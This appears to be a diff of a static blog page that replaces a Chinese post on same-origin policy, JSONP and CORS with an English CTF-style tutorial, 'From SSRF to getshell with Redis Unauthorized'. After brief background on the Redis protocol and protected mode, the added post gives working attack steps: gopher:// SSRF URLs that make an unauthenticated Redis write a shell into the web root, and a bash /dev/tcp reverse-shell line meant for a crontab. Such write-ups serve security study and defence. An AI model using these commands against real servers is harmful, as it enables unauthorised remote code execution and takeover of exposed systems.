@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="json,jsonp," />
+  <meta name="keywords" content="redis,ssrf," />
 
 
 
@@ -79,26 +79,17 @@
 
 
 
-<meta name="description" content="生命的滋味，无论是阳春白雪，青菜豆腐，都要自己去尝一尝啊。   SAME-ORIGIN POLICY(同源策略)出来捣乱，后来JSONP也跟着出现了，再后来CORS出来了。终究是为了解决问题。">
-<meta name="keywords" content="json,jsonp">
+<meta name="description" content="Here are some basics for better reading before we get deeper the detail of this vulnerabilities. RESP (Redis Serialization Protocol)  Feature Networking layer (Client connect to a Redis server creatin">
+<meta name="keywords" content="redis,ssrf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sop、jsonp和cors">
-<meta property="og:url" content="/sop-and-jsonp/index.html">
+<meta property="og:title" content="From SSRF to getshell with Redis Unauthorized">
+<meta property="og:url" content="/2017-12-01-How-to-write-shell-with-redis-unauthorized/index.html">
 <meta property="og:site_name" content="Security blog">
-<meta property="og:description" content="生命的滋味，无论是阳春白雪，青菜豆腐，都要自己去尝一尝啊。   SAME-ORIGIN POLICY(同源策略)出来捣乱，后来JSONP也跟着出现了，再后来CORS出来了。终究是为了解决问题。">
-<meta property="og:image" content="/sop-and-jsonp/jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/img-jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/src-jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/src-ex-jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/src-simple-jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/scr-ex-jsonp.png">
-<meta property="og:image" content="/sop-and-jsonp/cors-simple.png">
-<meta property="og:image" content="/sop-and-jsonp/cors-preflight.png">
-<meta property="og:updated_time" content="2017-12-05T14:34:00.816Z">
+<meta property="og:description" content="Here are some basics for better reading before we get deeper the detail of this vulnerabilities. RESP (Redis Serialization Protocol)  Feature Networking layer (Client connect to a Redis server creatin">
+<meta property="og:updated_time" content="2017-12-10T11:32:13.339Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sop、jsonp和cors">
-<meta name="twitter:description" content="生命的滋味，无论是阳春白雪，青菜豆腐，都要自己去尝一尝啊。   SAME-ORIGIN POLICY(同源策略)出来捣乱，后来JSONP也跟着出现了，再后来CORS出来了。终究是为了解决问题。">
-<meta name="twitter:image" content="/sop-and-jsonp/jsonp.png">
+<meta name="twitter:title" content="From SSRF to getshell with Redis Unauthorized">
+<meta name="twitter:description" content="Here are some basics for better reading before we get deeper the detail of this vulnerabilities. RESP (Redis Serialization Protocol)  Feature Networking layer (Client connect to a Redis server creatin">
 
 
 
@@ -128,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="/sop-and-jsonp/"/>
+  <link rel="canonical" href="/2017-12-01-How-to-write-shell-with-redis-unauthorized/"/>
 
 
 
 
 
-  <title>sop、jsonp和cors | Security blog</title>
+  <title>From SSRF to getshell with Redis Unauthorized | Security blog</title>
   
 
 
@@ -271,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/sop-and-jsonp/">
+    <link itemprop="mainEntityOfPage" href="/2017-12-01-How-to-write-shell-with-redis-unauthorized/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ꭰ">
@@ -288,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sop、jsonp和cors</h1>
+          <h1 class="post-title" itemprop="name headline">From SSRF to getshell with Redis Unauthorized</h1>
         
 
         <div class="post-meta">
@@ -300,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-28T20:59:06+08:00">
-                2017-05-28
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-10T19:32:27+08:00">
+                2017-12-10
               </time>
             
 
@@ -323,8 +314,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/FrontEnd/" itemprop="url" rel="index">
-                    <span itemprop="name">FrontEnd</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -360,29 +351,47 @@
       
 
       
-        <blockquote class="blockquote-center"><p>生命的滋味，无论是阳春白雪，青菜豆腐，都要自己去尝一尝啊。 </p>
-</blockquote>
-<p><em>SAME-ORIGIN POLICY(同源策略)出来捣乱，后来JSONP也跟着出现了，再后来CORS出来了。终究是为了解决问题。</em></p>
-<a id="more"></a>
-<h3 id="SOP"><a href="#SOP" class="headerlink" title="SOP"></a>SOP</h3><p>同源策略严格的控制了两个源之间的资源交互。这是用来隔离恶意文件的安全机制。</p>
-<h4 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h4><p>拥有相同<code>协议</code>,<code>端口</code>,<code>主机</code>的页面才称为同源。假设有这么个页面(<a href="http://localhost/index.html" target="_blank" rel="external">http://localhost/index.html</a>)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://localhost/other.html  <span class="comment">#同源</span></div><div class="line">http://localhost/inner/another.html  <span class="comment">#同源</span></div><div class="line">https://localhost/ssl.html </div><div class="line">http://localhost:<span class="number">8888</span>/index.html</div><div class="line">http://www.localhost/index.html</div></pre></td></tr></table></figure>
-<h4 id="同源的作用"><a href="#同源的作用" class="headerlink" title="同源的作用"></a>同源的作用</h4><p><img src="/sop-and-jsonp/jsonp.png" alt="同源的作用"></p>
-<p>Server端: <code>http://localhost:8000</code><br>Client端: <code>http://localhost:8080</code></p>
-<p>Server端放了一串字符<code>Server data</code>。Client代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var url = <span class="string">"http://localhost:8000"</span>;</div><div class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">req.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.responseText);  <span class="comment">// 打印出服务端的数据</span></div><div class="line">&#125;)</div><div class="line">req.open(<span class="string">"GET"</span>, url);</div><div class="line">req.send()</div></pre></td></tr></table></figure></p>
-<p>打开localhost:8080时，控制台并没有打印出服务端的数据，而是提示了<em>Cross-origin Request Blocked</em>。</p>
-<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>在开发中，经常能看到<code>script</code>和<code>img</code>标签引用外部资源(不同源),这是合法的。所以为了解决同源问题，在js代码中创造<code>img</code>和<code>script</code>标签来进行数据交互。</p>
-<p><img src="/sop-and-jsonp/img-jsonp.png" alt="img"><br>从图中可以看出只要给创建的img对象src赋值就可以进行跨域请求。<br><img src="/sop-and-jsonp/src-jsonp.png" alt="src"><br>而script标签却不是如此，它需要将script标签插入document中才行。注意script标签是js环境，所以server data会被js解析器解析，console台上会出现<code>Syntaxerror</code>。<br><img src="/sop-and-jsonp/src-ex-jsonp.png" alt="src"></p>
-<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p>利用script进行数据传输，这是jsonp的最简单模型。<br><img src="/sop-and-jsonp/src-simple-jsonp.png" alt="jsonp原型"><br>平时常见的jsonp一般都是<code>http://xxxx/q=?&amp;callback=?</code>。<br><img src="/sop-and-jsonp/scr-ex-jsonp.png" alt="scr"></p>
-<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。CORS通信的关键在服务器端的设置。详情参考阮一峰老师的文章。</p>
-<p>HTTP请求被CORS标准分成了两类，一种是Simple，一种Preflight。如果说A、B同时从一个位置出发，那么Simple则是选择了直达车，而Preflight则是选择了中转方案。当然无论是直达车还是中转车，都需要票（<code>Access-Control-Allow-Origin和Access-Control-Allow-Methods</code>）的存在才能抵达终点。</p>
-<p><em>直达车(Simple):</em><br><img src="/sop-and-jsonp/cors-simple.png" alt="simple"></p>
-<p><em>中转(Preflight):</em><br><img src="/sop-and-jsonp/cors-preflight.png" alt="simple"></p>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
-<li><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing" target="_blank" rel="external">CORS-wiki</a></li>
-<li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a></li>
-<li><a href="http://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html" target="_blank" rel="external">深入浅出JSONP–解决ajax跨域问题</a></li>
-<li><a href="http://www.infoq.com/cn/articles/JSONP-attack" target="_blank" rel="external">利用JSONP进行水坑攻击</a></li>
+        <p>Here are some basics for better reading before we get deeper the detail of this vulnerabilities.</p>
+<h3 id="RESP-Redis-Serialization-Protocol-Feature"><a href="#RESP-Redis-Serialization-Protocol-Feature" class="headerlink" title="RESP (Redis Serialization Protocol)  Feature"></a><em>RESP (Redis Serialization Protocol)  Feature</em></h3><ol>
+<li><em>Networking layer</em> (Client connect to a Redis server creating a <em>TCP</em> connection to the port 6379)</li>
+<li><em>Request-Respone model</em>(Redis accepts commands composed of different arguments. Once a command is received, it is processed and a reply is sent back to the client)<ul>
+<li>Redis supports pipelining (covered later in this document). So it is possible for clients to send multiple commands at once, and wait for replies later</li>
+<li>When a Redis client subscribes to a Pub/Sub channel, the protocol changes semantics and becomes a <em>push</em>protocol, that is, the client no longer requires to send commands, because the server will automatically send to the client new messages (for the channels the client is subscribed to) as soon as they are received.</li>
+</ul>
+</li>
+<li>Support five data types<ul>
+<li><strong>Simple Strings</strong> the first byte of the reply is “+”</li>
+<li><strong>Errors</strong> the first byte of the reply is “-“</li>
+<li><strong>Integers</strong> the first byte of the reply is “:”</li>
+<li><strong>Bulk Strings</strong> the first byte of the reply is “$”</li>
+<li><strong>Arrays</strong> the first byte of the reply is “<code>*</code>“</li>
+</ul>
+</li>
+</ol>
+<h3 id="Redis-Protected-mode"><a href="#Redis-Protected-mode" class="headerlink" title="Redis Protected mode"></a><em>Redis Protected mode</em></h3><p>Since <strong><em>version 3.2.0</em></strong>, when Redis is executed with the default configuration (binding all the interfaces) and without any password in order to access it, it enters a special mode called <strong><em>protected mode</em></strong>. In this mode Redis <strong><em>only replies to queries from the loopback interfaces, and reply to other clients connecting from other addresses with an error</em></strong>, explaining what is happening and how to configure Redis properly.</p>
+<h3 id="Hack-the-Redis"><a href="#Hack-the-Redis" class="headerlink" title="Hack the Redis"></a><em>Hack the Redis</em></h3><h4 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a><em>Prerequisites</em></h4><ol>
+<li>Run redis-server with the default config as the <em>root</em> user.</li>
+<li>Know the path of the server</li>
+</ol>
+<h4 id="Self-test"><a href="#Self-test" class="headerlink" title="Self-test"></a><em>Self-test</em></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-server --port 6378</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:6379,fork tcp-connect:localhost:6378</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl -v "gopher://127.0.0.1:6379/_info"</div><div class="line">curl -v "gopher://127.0.0.1:6379/!info"</div></pre></td></tr></table></figure>
+<p>We need to add something before the <em>path info</em>, because the gopher protocol will <em>ignore the first char of the path</em>. Then you will see the following output.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Server redis_version:3.2.10 </div><div class="line">...</div><div class="line">...</div><div class="line">...</div><div class="line">+OK</div></pre></td></tr></table></figure>
+<p><strong><em>Last but not the least, the key to hack redis is to write file in redis server.</em></strong></p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a><em>Example</em></h4><p>Assuming that you found the <em>SSRF</em> vuln in the website and it runs the redis on the <em>port 6379</em>, then you can try the following to get shell.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_config%20set%20dir%20%2fwebpath</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_set%201%20%2fshellscript</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_config%20set%20dbfilename%20%2ffilename</div><div class="line">http://x/path?url=gopher://127.0.0.1/6379/_save%20</div></pre></td></tr></table></figure>
+<p>Then you can access the file wrote in the web root directory.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http://x/filename</span></div></pre></td></tr></table></figure>
+<p>Of course, you can write crontab task to get shell.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p>Happy Hacking</p>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><em>Reference</em></h3><ul>
+<li><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html#0x02" target="_blank" rel="external">getshell-via-ssrf-and-redis</a></li>
+<li><a href="http://www.angelwhu.com/blog/?p=427" target="_blank" rel="external">attack cgi with ssrf</a></li>
+<li><a href="https://redis.io/topics/security" target="_blank" rel="external">Redis Security</a></li>
+<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">gopher-attack-surfaces</a></li>
 </ul>
 
       
@@ -401,9 +410,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/json/" rel="tag"># json</a>
+            <a href="/tags/redis/" rel="tag"># redis</a>
           
-            <a href="/tags/jsonp/" rel="tag"># jsonp</a>
+            <a href="/tags/ssrf/" rel="tag"># ssrf</a>
           
         </div>
       
@@ -416,8 +425,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/url-encode/" rel="next" title="聊聊编码">
-                <i class="fa fa-chevron-left"></i> 聊聊编码
+              <a href="/2017-12-08-Procrastinate-to-the-death/" rel="next" title="Procrastinate to the death">
+                <i class="fa fa-chevron-left"></i> Procrastinate to the death
               </a>
             
           </div>
@@ -425,10 +434,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/keyboard-symbol/" rel="prev" title="键盘符号英文">
-                键盘符号英文 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -589,7 +594,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SOP"><span class="nav-number">1.</span> <span class="nav-text">SOP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源的定义"><span class="nav-number">1.1.</span> <span class="nav-text">同源的定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#同源的作用"><span class="nav-number">1.2.</span> <span class="nav-text">同源的作用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP"><span class="nav-number">2.</span> <span class="nav-text">JSONP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据传输"><span class="nav-number">2.1.</span> <span class="nav-text">数据传输</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CORS"><span class="nav-number">3.</span> <span class="nav-text">CORS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#RESP-Redis-Serialization-Protocol-Feature"><span class="nav-number">1.</span> <span class="nav-text">RESP (Redis Serialization Protocol)  Feature</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis-Protected-mode"><span class="nav-number">2.</span> <span class="nav-text">Redis Protected mode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hack-the-Redis"><span class="nav-number">3.</span> <span class="nav-text">Hack the Redis</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Prerequisites"><span class="nav-number">3.1.</span> <span class="nav-text">Prerequisites</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Self-test"><span class="nav-number">3.2.</span> <span class="nav-text">Self-test</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Example"><span class="nav-number">3.3.</span> <span class="nav-text">Example</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
